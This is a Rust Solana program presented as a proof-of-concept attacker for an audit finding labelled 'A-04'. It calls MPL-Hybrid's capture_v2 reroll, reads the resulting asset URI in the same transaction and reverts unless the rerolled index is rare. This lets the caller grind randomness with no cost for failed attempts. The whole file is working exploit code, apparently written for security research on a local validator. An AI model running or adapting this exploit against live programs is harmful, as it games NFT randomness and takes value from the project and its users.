//! A-04 PoC attacker program (LOCAL VALIDATOR ONLY). CPIs MPL-Hybrid capture_v2 (reroll mode), then
//! reads the asset's new URI from the post-CPI account data IN THE SAME TX and aborts unless the
//! rerolled index is < rare_max. Aborted attempts leave no state change (tokens, NFT, fees all revert).
//! ix data: [rare_max: u64 LE]; accounts: [0] mpl_hybrid program, [1..=17] capture_v2 accounts in order.
use solana_program::{
    account_info::AccountInfo, entrypoint, entrypoint::ProgramResult, instruction::{AccountMeta, Instruction},
    msg, program::invoke, program_error::ProgramError, pubkey::Pubkey,
};

entrypoint!(process);

const CAPTURE_V2_DISC: [u8; 8] = [0x9c, 0x9c, 0x9d, 0x9a, 0x2c, 0x4e, 0x86, 0x2c]; // placeholder, overwritten from ix data

fn process(_pid: &Pubkey, accounts: &[AccountInfo], data: &[u8]) -> ProgramResult {
    let _ = CAPTURE_V2_DISC;
    if data.len() < 16 { return Err(ProgramError::InvalidInstructionData); }
    let rare_max = u64::from_le_bytes(data[0..8].try_into().unwrap());
    let disc = &data[8..16]; // anchor discriminator for capture_v2, passed by the client
    let hybrid = &accounts[0];
    let cap = &accounts[1..18];
    let metas: Vec<AccountMeta> = cap.iter().map(|a| if a.is_writable { AccountMeta::new(*a.key, a.is_signer) } else { AccountMeta::new_readonly(*a.key, a.is_signer) }).collect();
    let ix = Instruction { program_id: *hybrid.key, accounts: metas, data: disc.to_vec() };
    let mut infos: Vec<AccountInfo> = cap.to_vec();
    infos.push(hybrid.clone());
    invoke(&ix, &infos)?;
    // asset = capture account index 4. BaseAssetV1: key u8 | owner 32 | update_authority (u8 tag [+32]) | name | uri
    let asset = &cap[4];
    let d = asset.try_borrow_data()?;
    let mut o = 1 + 32;
    let tag = d[o]; o += 1; if tag != 0 { o += 32; }
    let nl = u32::from_le_bytes(d[o..o + 4].try_into().unwrap()) as usize; o += 4 + nl;
    let ul = u32::from_le_bytes(d[o..o + 4].try_into().unwrap()) as usize; o += 4;
    let uri = core::str::from_utf8(&d[o..o + ul]).map_err(|_| ProgramError::InvalidAccountData)?;
    let stem = uri.strip_suffix(".json").ok_or(ProgramError::InvalidAccountData)?;
    let digits: String = stem.chars().rev().take_while(|c| c.is_ascii_digit()).collect::<Vec<_>>().into_iter().rev().collect();
    let idx: u64 = digits.parse().map_err(|_| ProgramError::InvalidAccountData)?;
    msg!("GUARD rerolled index {} (uri {})", idx, uri);
    if idx >= rare_max {
        msg!("GUARD ABORT: not rare");
        return Err(ProgramError::Custom(0xBAD));
    }
    msg!("GUARD COMMIT: rare");
    Ok(())
}
